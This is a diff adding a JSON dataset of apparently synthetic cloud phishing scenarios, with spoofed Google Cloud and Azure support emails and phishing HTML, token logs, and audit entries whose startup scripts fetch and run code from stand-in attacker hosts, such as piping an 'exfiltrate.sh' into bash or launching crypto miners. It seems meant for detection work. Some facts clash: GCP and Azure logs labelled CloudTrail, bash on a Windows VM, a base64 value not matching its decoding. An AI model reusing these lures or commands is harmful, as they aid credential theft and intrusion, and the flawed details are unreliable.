@@ -1,0 +1,1532 @@
+{
+  "samples": [
+    {
+      "scenario": "Phishing email impersonates Google Cloud Platform support, capturing user credentials and enabling unauthorized creation of a Compute Engine instance running a hidden data exfiltration script.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@gcp-support-secure.com>\r\nReceived: from mail.gcp-support-secure.com (mail.gcp-support-secure.com [203.0.113.99])\r\n\tby inbound.mail.example.com with ESMTPS id v6H9s1kN\r\n\tfor <victim@company.com>; Wed, 19 Apr 2023 09:15:10 -0700 (PDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.5\r\nX-Phishing-Confidence: 88\r\nX-Mailer: PHPMailer 6.4.1 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Google Cloud Account Verification Required\r\nFrom: Google Cloud Support <no-reply@gcp-support-secure.com>\r\nTo: victim@company.com\r\nMessage-ID: <20230419091510.7654321@mail.gcp-support-secure.com>",
+        "email_body_html": "<html><body><p>Dear Google Cloud User,</p><p>We noticed unusual login attempts on your account. Please confirm your credentials to secure your projects.</p><p><a href=\"https://gcp.verify-account-secure.com/login?email=victim@company.com\">Verify your account here</a></p><p>Regards,<br>Google Cloud Support Team</p></body></html>",
+        "phishing_url": "https://gcp.verify-account-secure.com/login?email=victim@company.com",
+        "domain_registration": {
+          "domain": "gcp.verify-account-secure.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-04-12T14:00:00Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.99",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.gcp.verify-account-secure.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.gcp-support-secure.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.gcp-support-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<no-reply@gcp-support-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 4A7B1D55\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-04-19T09:20:05Z",
+          "source_ip": "198.51.100.123",
+          "api_endpoint": "https://oauth2.googleapis.com/token",
+          "parameters": {
+            "grant_type": "authorization_code",
+            "client_id": "phishing-client-id.apps.googleusercontent.com",
+            "client_secret": "phishing-client-secret",
+            "code": "4/0AY0e-g6fakeauthorizationcode",
+            "redirect_uri": "https://gcp.verify-account-secure.com/oauth2callback"
+          },
+          "response": {
+            "access_token": "ya29.a0AfH6SMBfakeaccesstokenstring",
+            "expires_in": 3599,
+            "refresh_token": "1//0gfakeRefreshTokenString",
+            "scope": "https://www.googleapis.com/auth/cloud-platform",
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-04-19T09:22:10Z",
+            "eventSource": "compute.googleapis.com",
+            "eventName": "v1.compute.instances.insert",
+            "userIdentity": {
+              "type": "OAuth",
+              "principalId": "user-victim@company.com",
+              "sessionContext": "phished-oauth-session-20230419"
+            },
+            "requestParameters": {
+              "project": "company-gcp-project",
+              "zone": "us-central1-a",
+              "resource": {
+                "name": "exfiltration-instance",
+                "machineType": "zones/us-central1-a/machineTypes/n1-standard-1",
+                "disks": [
+                  {
+                    "boot": true,
+                    "autoDelete": true,
+                    "initializeParams": {
+                      "sourceImage": "projects/debian-cloud/global/images/family/debian-10"
+                    }
+                  }
+                ],
+                "metadata": {
+                  "items": [
+                    {
+                      "key": "startup-script",
+                      "value": "#!/bin/bash\ncurl -s http://malicious-server.com/exfiltrate.sh | bash\n"
+                    }
+                  ]
+                }
+              }
+            },
+            "responseElements": {
+              "targetLink": "https://www.googleapis.com/compute/v1/projects/company-gcp-project/zones/us-central1-a/instances/exfiltration-instance"
+            },
+            "sourceIPAddress": "198.51.100.123",
+            "userAgent": "google-api-python-client/2.39.0"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\ncurl -s http://malicious-server.com/exfiltrate.sh | bash\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "ComputeAdmin",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/compute.admin",
+                "members": [
+                  "user:victim@company.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "gcp.verify-account-secure.com",
+        "phishing_ip": "203.0.113.99",
+        "compromised_source_ip": "198.51.100.123",
+        "assumed_role_session_name": "phished-oauth-session-20230419",
+        "malicious_instance_name": "exfiltration-instance",
+        "malicious_user_data_script": "#!/bin/bash\ncurl -s http://malicious-server.com/exfiltrate.sh | bash\n"
+      },
+      "detection_method": "Detect phishing emails with suspicious domain 'gcp.verify-account-secure.com' by email gateways. Monitor OAuth token requests from unusual IP addresses. Analyze Google Cloud audit logs for Compute Engine instance creations with suspicious startup scripts. Correlate with IAM roles granting broad compute admin privileges. Use endpoint protection to detect network connections to known malicious URLs.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1059.004",
+        "T1098",
+        "T1071.001",
+        "T1496"
+      ]
+    },
+    {
+      "scenario": "Phishing email spoofing Microsoft Azure support prompts user credential entry on fake portal, resulting in unauthorized Azure VM creation running ransomware encryption payload.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alert@azuresupport-sec.com>\r\nReceived: from mail.azuresupport-sec.com (mail.azuresupport-sec.com [192.0.2.50])\r\n\tby inbound.mail.example.com with ESMTPS id v9J8k2fL\r\n\tfor <victim@company.com>; Thu, 20 Apr 2023 16:03:45 -0700 (PDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 2.1\r\nX-Phishing-Confidence: 90\r\nX-Mailer: PHPMailer 6.3.0 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Important] Azure Security Account Verification\r\nFrom: Microsoft Azure Support <security-alert@azuresupport-sec.com>\r\nTo: victim@company.com\r\nMessage-ID: <20230420160345.9876543@mail.azuresupport-sec.com>",
+        "email_body_html": "<html><body><p>Hello Azure Customer,</p><p>Due to recent suspicious activities, please confirm your Azure credentials to secure your subscription.</p><p><a href=\"https://login-azure-secure.com/auth?user=victim@company.com\">Confirm your account here</a></p><p>Best regards,<br>Microsoft Azure Security Team</p></body></html>",
+        "phishing_url": "https://login-azure-secure.com/auth?user=victim@company.com",
+        "domain_registration": {
+          "domain": "login-azure-secure.com",
+          "registrar": "Tucows Domains Inc.",
+          "creation_date": "2023-04-15T08:30:20Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "192.0.2.50",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.login-azure-secure.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.azuresupport-sec.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.azuresupport-sec.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security-alert@azuresupport-sec.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7C3D4F22\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-04-20T16:10:30Z",
+          "source_ip": "198.51.100.201",
+          "api_endpoint": "https://login.microsoftonline.com/common/oauth2/token",
+          "parameters": {
+            "grant_type": "password",
+            "client_id": "phishing-client-id",
+            "client_secret": "phishing-client-secret",
+            "username": "victim@company.com",
+            "password": "userpassword123",
+            "resource": "https://management.azure.com/"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.fakejwttokenstring",
+            "expires_in": 3600,
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-04-20T16:15:05Z",
+            "eventSource": "management.azure.com",
+            "eventName": "Microsoft.Compute/virtualMachines/write",
+            "userIdentity": {
+              "type": "OAuth",
+              "principalId": "user-victim@company.com",
+              "sessionContext": "phished-oauth-session-20230420"
+            },
+            "requestParameters": {
+              "resourceGroupName": "prod-resources",
+              "vmName": "ransomware-vm-01",
+              "properties": {
+                "hardwareProfile": {
+                  "vmSize": "Standard_DS1_v2"
+                },
+                "storageProfile": {
+                  "imageReference": {
+                    "publisher": "MicrosoftWindowsServer",
+                    "offer": "WindowsServer",
+                    "sku": "2019-Datacenter",
+                    "version": "latest"
+                  }
+                },
+                "osProfile": {
+                  "computerName": "ransomware-vm-01",
+                  "adminUsername": "adminuser",
+                  "customData": "IyEvYmluL2Jhc2gKc3RhcnQgcmFuc29td2FyZS5leGU="
+                }
+              }
+            },
+            "responseElements": {
+              "vmId": "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/resourceGroups/prod-resources/providers/Microsoft.Compute/virtualMachines/ransomware-vm-01"
+            },
+            "sourceIPAddress": "198.51.100.201",
+            "userAgent": "AzureCLI/2.30.0"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\nstart ransomware.exe",
+        "iam_policy_misconfiguration": {
+          "policyName": "Contributor",
+          "policyDocument": {
+            "assignments": [
+              {
+                "roleDefinitionName": "Contributor",
+                "principalId": "user-victim@company.com",
+                "scope": "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "login-azure-secure.com",
+        "phishing_ip": "192.0.2.50",
+        "compromised_source_ip": "198.51.100.201",
+        "assumed_role_session_name": "phished-oauth-session-20230420",
+        "malicious_vm_name": "ransomware-vm-01",
+        "malicious_user_data_base64": "IyEvYmluL2Jhc2gKc3RhcnQgcmFuc29td2FyZS5leGU="
+      },
+      "detection_method": "Use email filtering to block phishing domains like 'login-azure-secure.com'. Monitor OAuth token grants from unusual IP addresses. Analyze Azure activity logs for new VM creation with suspicious base64 encoded customData scripts. Alert on users with Contributor role performing unusual resource deployments. Employ endpoint detection to identify ransomware execution patterns.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1059.004",
+        "T1496",
+        "T1071.001"
+      ]
+    },
+    {
+      "scenario": "Phishing email impersonates Google Cloud support to steal credentials, resulting in unauthorized creation of a compute instance running a cryptocurrency miner in Google Cloud Platform.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@gcsecurity-alerts.com>\r\nReceived: from mail.gcsecurity-alerts.com (mail.gcsecurity-alerts.com [203.0.113.150])\r\n\tby inbound.mail.example.org with ESMTPS id A8B9c3dF\r\n\tfor <employee@enterprise.com>; Wed, 19 Jul 2023 08:32:48 -0400 (EDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.7\r\nX-Phishing-Confidence: 90\r\nX-Mailer: PHPMailer 6.6.0 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Google Cloud Account Verification Required\r\nFrom: Google Cloud Support <no-reply@gcsecurity-alerts.com>\r\nTo: employee@enterprise.com\r\nMessage-ID: <20230719083248.9876543@mail.gcsecurity-alerts.com>",
+        "email_body_html": "<html><body><p>Dear Google Cloud User,</p><p>We have detected unauthorized access attempts to your Google Cloud account. Please verify your credentials immediately using the link below to secure your account.</p><p><a href=\"https://gcp-secure-login.com/verify?user=employee@enterprise.com\">Verify your account now</a></p><p>Thank you,<br>Google Cloud Security Team</p></body></html>",
+        "phishing_url": "https://gcp-secure-login.com/verify?user=employee@enterprise.com",
+        "domain_registration": {
+          "domain": "gcp-secure-login.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-07-15T14:12:30Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.150",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.gcp-secure-login.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.gcp-secure-login.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.gcp-secure-login.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<no-reply@gcsecurity-alerts.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7D4C5E02\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-07-19T08:35:10Z",
+          "source_ip": "198.51.100.99",
+          "api_endpoint": "https://oauth2.googleapis.com/token",
+          "parameters": {
+            "grant_type": "authorization_code",
+            "client_id": "phishing-client-id.apps.googleusercontent.com",
+            "client_secret": "phishing-client-secret",
+            "code": "4/P7q7W91a-oMsCeLvIaQm6bTrgtp7",
+            "redirect_uri": "https://gcp-secure-login.com/oauth2callback"
+          },
+          "response": {
+            "access_token": "ya29.a0AfH6SMBEXAMPLEACCESSTOKEN",
+            "expires_in": 3599,
+            "refresh_token": "1//0gEXAMPLEREFRESHTOKEN",
+            "scope": "https://www.googleapis.com/auth/cloud-platform",
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-07-19T08:36:45Z",
+            "eventSource": "compute.googleapis.com",
+            "eventName": "instances.insert",
+            "userIdentity": {
+              "type": "OAuth",
+              "principalEmail": "employee@enterprise.com",
+              "callerIp": "198.51.100.99"
+            },
+            "requestParameters": {
+              "zone": "us-central1-a",
+              "resource": {
+                "name": "crypto-miner-instance",
+                "machineType": "n1-standard-1",
+                "disks": [
+                  {
+                    "boot": true,
+                    "autoDelete": true,
+                    "initializeParams": {
+                      "sourceImage": "projects/debian-cloud/global/images/debian-11-bullseye-v20230620"
+                    }
+                  }
+                ],
+                "metadata": {
+                  "items": [
+                    {
+                      "key": "startup-script",
+                      "value": "#!/bin/bash\ncurl -fsSL https://maliciousfile.com/miner.sh -o /tmp/miner.sh\nchmod +x /tmp/miner.sh\n/tmp/miner.sh"
+                    }
+                  ]
+                }
+              }
+            },
+            "responseElements": {
+              "id": "projects/enterprise/zones/us-central1-a/instances/crypto-miner-instance"
+            },
+            "sourceIPAddress": "198.51.100.99",
+            "userAgent": "google-api-python-client/2.34.0 (gzip)"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\ncurl -fsSL https://maliciousfile.com/miner.sh -o /tmp/miner.sh\nchmod +x /tmp/miner.sh\n/tmp/miner.sh\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "ComputeAdmin",
+          "policyDocument": {
+            "bindings": [
+              {
+                "role": "roles/compute.admin",
+                "members": [
+                  "user:employee@enterprise.com"
+                ]
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "gcp-secure-login.com",
+        "phishing_ip": "203.0.113.150",
+        "compromised_source_ip": "198.51.100.99",
+        "oauth_access_token": "ya29.a0AfH6SMBEXAMPLEACCESSTOKEN",
+        "malicious_instance_name": "crypto-miner-instance",
+        "malicious_startup_script": "#!/bin/bash\ncurl -fsSL https://maliciousfile.com/miner.sh -o /tmp/miner.sh\nchmod +x /tmp/miner.sh\n/tmp/miner.sh\n"
+      },
+      "detection_method": "Monitor Google Cloud audit logs for instances.insert events from unusual IP addresses and OAuth tokens issued shortly after phishing email timestamps. Alert on creation of instances with suspicious startup scripts downloading external binaries. Correlate IAM bindings to detect excessive permissions granted to compromised users. Use email gateway filters to block suspicious domains mimicking Google Cloud support and employ user training to reduce phishing susceptibility.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1059.004",
+        "T1105",
+        "T1071.001",
+        "T1496",
+        "T1098"
+      ]
+    },
+    {
+      "scenario": "Phishing email spoofing Microsoft Azure support captures user credentials, enabling attacker to create a Virtual Machine running a stealthy crypto-miner in Azure environment.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@azure-support-secure.com>\r\nReceived: from mail.azure-support-secure.com (mail.azure-support-secure.com [198.51.100.210])\r\n\tby inbound.mail.corp.net with ESMTPS id X1Y2Z3A4\r\n\tfor <admin@corp.net>; Fri, 03 Mar 2023 16:22:11 +0100\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.5\r\nX-Phishing-Confidence: 88\r\nX-Mailer: PHPMailer 6.4.1 (https://github.com/PHPMailer/PHPMailer)\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Important] Azure Account Security Alert\r\nFrom: Microsoft Azure Support <security@azure-support-secure.com>\r\nTo: admin@corp.net\r\nMessage-ID: <20230303162211.456789@mail.azure-support-secure.com>",
+        "email_body_html": "<html><body><p>Hello Azure Customer,</p><p>We detected suspicious sign-in activity on your Azure account. Please log in immediately to confirm your identity and secure your account.</p><p><a href=\"https://azure-account-verify.com/login?user=admin@corp.net\">Verify your account</a></p><p>Regards,<br>Azure Security Team</p></body></html>",
+        "phishing_url": "https://azure-account-verify.com/login?user=admin@corp.net",
+        "domain_registration": {
+          "domain": "azure-account-verify.com",
+          "registrar": "PDR Ltd. d/b/a PublicDomainRegistry.com",
+          "creation_date": "2023-02-25T09:45:12Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "UA"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "198.51.100.210",
+              "ttl": 300
+            },
+            {
+              "type": "MX",
+              "value": "mail.azure-account-verify.com",
+              "ttl": 300
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.azure-account-verify.com ESMTP Postfix\r\nEHLO attacker-server\r\n250-mail.azure-account-verify.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security@azure-support-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@corp.net>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 9G6H7I08\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-03-03T16:25:35Z",
+          "source_ip": "198.51.100.99",
+          "api_endpoint": "https://login.microsoftonline.com/common/oauth2/token",
+          "parameters": {
+            "grant_type": "password",
+            "client_id": "00000003-0000-0000-c000-000000000000",
+            "resource": "https://management.azure.com/",
+            "username": "admin@corp.net",
+            "password": "REDACTED"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ij...",
+            "expires_in": 3599,
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-03-03T16:27:00Z",
+            "eventSource": "Microsoft.Compute",
+            "eventName": "VirtualMachines_CreateOrUpdate",
+            "userIdentity": {
+              "type": "User",
+              "userPrincipalName": "admin@corp.net",
+              "ipAddress": "198.51.100.99"
+            },
+            "requestParameters": {
+              "resourceGroupName": "Prod-ResourceGroup",
+              "vmName": "stealth-crypto-miner",
+              "parameters": {
+                "hardwareProfile": {
+                  "vmSize": "Standard_D2s_v3"
+                },
+                "storageProfile": {
+                  "imageReference": {
+                    "publisher": "Canonical",
+                    "offer": "UbuntuServer",
+                    "sku": "18.04-LTS",
+                    "version": "latest"
+                  }
+                },
+                "osProfile": {
+                  "computerName": "stealth-crypto-miner",
+                  "adminUsername": "azureuser",
+                  "customData": "IyEvYmluL2Jhc2gKY3VybCAtcSBodHRwczovL21hbGljaW91cy1iaW5hcnkuY29tL21pbmVyLnNoIC1vIC90bXAvbWluZXIuc2gKY2htb2QgK3ggL3RtcC9taW5lci5zaApcdC90bXAvbWluZXIuc2ggLS1wb29sIHRjcDovL3Bvb2wueGF6dXJlLmNvbTo1NjU2IC0tdXNlcjogY3J5cHRvY29pbi51c2VyCg=="
+                },
+                "networkProfile": {
+                  "networkInterfaces": [
+                    {
+                      "id": "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/resourceGroups/Prod-ResourceGroup/providers/Microsoft.Network/networkInterfaces/stealth-crypto-miner-nic"
+                    }
+                  ]
+                }
+              }
+            },
+            "responseElements": {
+              "vmId": "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/resourceGroups/Prod-ResourceGroup/providers/Microsoft.Compute/virtualMachines/stealth-crypto-miner"
+            },
+            "sourceIPAddress": "198.51.100.99",
+            "userAgent": "AzureCLI/2.45.0 (Python 3.9.12; Linux x86_64)"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\ncurl -q https://malicious-binary.com/miner.sh -o /tmp/miner.sh\nchmod +x /tmp/miner.sh\n/tmp/miner.sh --pool tcp://pool.azurecryptomining.net:4444 --user cryptoadmin.worker\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "Contributor",
+          "policyDocument": {
+            "assignableScopes": [
+              "/subscriptions/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+            ],
+            "permissions": [
+              {
+                "actions": [
+                  "Microsoft.Compute/*",
+                  "Microsoft.Network/*",
+                  "Microsoft.Storage/*"
+                ],
+                "notActions": []
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "azure-account-verify.com",
+        "phishing_ip": "198.51.100.210",
+        "compromised_source_ip": "198.51.100.99",
+        "oauth_access_token_partial": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ij...",
+        "malicious_vm_name": "stealth-crypto-miner",
+        "malicious_custom_data_base64": "IyEvYmluL2Jhc2gKY3VybCAtcSBodHRwczovL21hbGljaW91cy1iaW5hcnkuY29tL21pbmVyLnNoIC1vIC90bXAvbWluZXIuc2gKY2htb2QgK3ggL3RtcC9taW5lci5zaApcdC90bXAvbWluZXIuc2ggLS1wb29sIHRjcDovL3Bvb2wueGF6dXJlLmNvbTo1NjU2IC0tdXNlcjogY3J5cHRvY29pbi51c2VyCg=="
+      },
+      "detection_method": "Analyze Azure Activity Logs for VM creation events from anomalous IPs and correlate with OAuth token requests following phishing email delivery. Inspect VM customData for scripts that download and execute suspicious binaries. Alert on accounts with broad Contributor permissions performing unusual resource creation. Employ email security gateways to detect spoofed domains and educate users on identifying phishing.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078.004",
+        "T1059.004",
+        "T1105",
+        "T1071.001",
+        "T1496",
+        "T1098"
+      ]
+    },
+    {
+      "scenario": "Phishing email impersonates Azure support to steal cloud admin credentials, resulting in unauthorized Azure Resource Manager deployments hosting a cryptocurrency mining extension.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@azuresupport-secure.com>\r\nReceived: from mail.azuresupport-secure.com (mail.azuresupport-secure.com [203.0.113.55])\r\n\tby inbound.mail.example.net with ESMTPS id p9R7t4dT\r\n\tfor <victim@enterprise.com>; Wed, 21 Jun 2023 08:22:10 -0700 (PDT)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 2.1\r\nX-Phishing-Confidence: 90\r\nX-Mailer: Microsoft Outlook 16.0\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\nSubject: [Urgent] Azure Subscription Access Alert\r\nFrom: Azure Support <security@azuresupport-secure.com>\r\nTo: victim@enterprise.com\r\nMessage-ID: <20230621082210.9876543@mail.azuresupport-secure.com>",
+        "email_body_html": "<html><body><p>Dear Azure Administrator,</p><p>Unusual login activity detected on your subscription. Please confirm your credentials immediately to maintain uninterrupted service.</p><p><a href=\"https://login.azuresupport-secure.com/verify?user=victim@enterprise.com\">Verify your account</a></p><p>Regards,<br>Azure Support Team</p></body></html>",
+        "phishing_url": "https://login.azuresupport-secure.com/verify?user=victim@enterprise.com",
+        "domain_registration": {
+          "domain": "azuresupport-secure.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-15T09:12:00Z",
+          "registrant": {
+            "name": "Redacted for privacy",
+            "organization": "Redacted",
+            "country": "CN"
+          },
+          "dns_records": [
+            {
+              "type": "A",
+              "value": "203.0.113.55",
+              "ttl": 3600
+            },
+            {
+              "type": "MX",
+              "value": "mail.azuresupport-secure.com",
+              "ttl": 3600
+            }
+          ]
+        },
+        "smtp_transaction_log": "220 mail.azuresupport-secure.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.azuresupport-secure.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security@azuresupport-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7D4B9F12\r\nQUIT\r\n221 2.0.0 Bye",
+        "oauth_token_request": {
+          "timestamp": "2023-06-21T08:25:40Z",
+          "source_ip": "198.51.100.99",
+          "api_endpoint": "https://login.microsoftonline.com/common/oauth2/token",
+          "parameters": {
+            "grant_type": "password",
+            "username": "victim@enterprise.com",
+            "password": "Redacted",
+            "scope": "https://management.azure.com/.default"
+          },
+          "response": {
+            "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIn...",
+            "expires_in": 3600,
+            "token_type": "Bearer"
+          }
+        },
+        "cloudtrail_logs": [
+          {
+            "eventTime": "2023-06-21T08:27:12Z",
+            "eventSource": "management.azure.com",
+            "eventName": "CreateDeployment",
+            "userIdentity": {
+              "type": "User",
+              "principalId": "8a7b1c2d-XXXX-XXXX-XXXX-abcdef123456",
+              "userName": "victim@enterprise.com"
+            },
+            "requestParameters": {
+              "deploymentName": "CryptoMinerDeployment",
+              "templateLink": {
+                "uri": "https://malicious-domain.net/azure/crypto-miner-template.json"
+              },
+              "parameters": {
+                "vmName": {
+                  "value": "miner-vm-01"
+                }
+              }
+            },
+            "responseElements": {
+              "statusCode": 202
+            },
+            "sourceIPAddress": "198.51.100.99",
+            "userAgent": "AzureCLI/2.33.0 (Windows)"
+          },
+          {
+            "eventTime": "2023-06-21T08:28:00Z",
+            "eventSource": "management.azure.com",
+            "eventName": "RunCommand",
+            "userIdentity": {
+              "type": "User",
+              "principalId": "8a7b1c2d-XXXX-XXXX-XXXX-abcdef123456",
+              "userName": "victim@enterprise.com"
+            },
+            "requestParameters": {
+              "commandId": "RunShellScript",
+              "parameters": {
+                "script": [
+                  "wget https://malicious-domain.net/miner -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner --pool stratum+tcp://pool.example.org:4444 --user mineruser.worker"
+                ]
+              },
+              "vmName": "miner-vm-01"
+            },
+            "sourceIPAddress": "198.51.100.99"
+          }
+        ],
+        "base64_user_data_decoded": "#!/bin/bash\nwget https://malicious-domain.net/miner -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner --pool stratum+tcp://pool.example.org:4444 --user mineruser.worker\n",
+        "iam_policy_misconfiguration": {
+          "policyName": "CloudAdmin",
+          "policyDocument": {
+            "Version": "2012-10-17",
+            "Statement": [
+              {
+                "Effect": "Allow",
+                "Action": [
+                  "Microsoft.Compute/virtualMachines/start/action",
+                  "Microsoft.Compute/virtualMachines/runCommand/action",
+                  "Microsoft.Resources/deployments/*"
+                ],
+                "Resource": "*"
+              }
+            ]
+          }
+        }
+      },
+      "indicators": {
+        "phishing_domain": "azuresupport-secure.com",
+        "phishing_ip": "203.0.113.55",
+        "compromised_source_ip": "198.51.100.99",
+        "malicious_user": "victim@enterprise.com",
+        "malicious_deployment_name": "CryptoMinerDeployment",
+        "malicious_user_data_decoded": "#!/bin/bash\nwget https://malicious-domain.net/miner -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner --pool stratum+tcp://pool.example.org:4444 --user mineruser.worker\n",
+        "malicious_run_command_script": "wget https://malicious-domain.net/miner -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner --pool stratum+tcp://pool.example.org:4444 --user mineruser.worker"
+      },
+      "detection_method": "Analyze Azure Activity Logs for deployments and run-command executions from unusual IP addresses, correlate with OAuth token requests from phishing domains, monitor email gateway for spoofed Azure support domains, and inspect for VM deployments with suspicious templates. Leverage endpoint monitoring to detect miner process execution and network connections to known mining pools.",
+      "relevant_mitre_techniques": [
